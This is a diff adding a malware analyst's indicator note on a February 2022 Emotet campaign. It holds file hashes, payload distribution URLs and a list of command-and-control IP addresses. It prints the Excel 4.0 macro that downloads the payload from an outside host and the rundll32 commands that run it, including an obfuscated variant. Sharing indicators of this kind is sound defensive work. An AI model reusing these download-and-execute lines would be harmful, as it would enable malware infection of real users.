@@ -1,0 +1,66 @@
+Emotet 2022 - 03.02.2022 - epoch5 - RedDawn Template xlm4.0
+
+************************************************************************************************************
+
+.xls 70b3bbdb11adac79a593c9edbef8590485e733c9cab62e9efa776bc9d08b7b90
+
+.dll 9b6ef45cddef683ee803c3e5658fce01ffa2ef38108f200a94d9a8d889920acd
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "hxxp://docs-construction.com/wp-admin/a0mJP2Adw5YTHt/", "..\iix.ocx")
+
+rundll32.exe ..\iix.ocx,D"&"l"&"lR"&"egister"&"Serve"&"r
+
+rundll32.exe C:\Users\Admin\iix.ocx",DllRegisterServer
+
+rundll32.exe C:\Windows\SysWOW64\Jxxrxsq\wkvp.nio",ltPxXjiFQHvfHCo
+
+rundll32.exe C:\Windows\System32\Jxxrxsq\wkvp.nio",DllRegisterServer
+
+GET: hxxps://172.105.115.71/UJhuDGCYdUWaqpFhuDiVRdPXqlQBfUeQGOLhMNPbNclZUSeHcXny
+
+.dll distro
+
+hxxp://docs-construction.com/wp-admin/a0mJP2Adw5YTHt/
+hxxp://laohange.com/wp-content/0qJRIjxxhZ/
+hxxp://centrobilinguelospinos.com/wp-admin/EIzEADnvS/
+hxxp://stancewheels.com/wp-admin/b5xkQkgEFiBmW/
+hxxp://jeffreylubin.igclout.com/wp-admin/0WGa0yF6b6F3VK5tb/
+
+c2's 
+
+172.105.115.71:443
+185.184.25.78:8080
+191.252.103.16:80
+207.148.81.119:8080
+37.44.244.177:8080
+210.57.209.142:8080
+37.59.209.141:8080
+59.148.253.194:443
+159.69.237.188:443
+195.154.146.35:443
+203.153.216.46:443
+104.131.62.48:8080
+173.203.78.138:443
+217.182.143.207:443
+54.38.242.185:443
+116.124.128.206:8080
+54.37.106.167:8080
+195.77.239.39:8080
+85.214.67.203:8080
+198.199.98.78:8080
+190.90.233.66:443
+103.41.204.169:8080
+185.148.168.15:8080
+185.148.168.220:8080
+142.4.219.173:8080
+168.197.250.14:80
+139.196.72.155:8080
+118.98.72.86:443
+128.199.192.135:8080
+78.46.73.125:443
+66.42.57.149:443
+78.47.204.80:443
+194.9.172.107:8080
+62.171.178.147:8080
+54.37.228.122:443
+
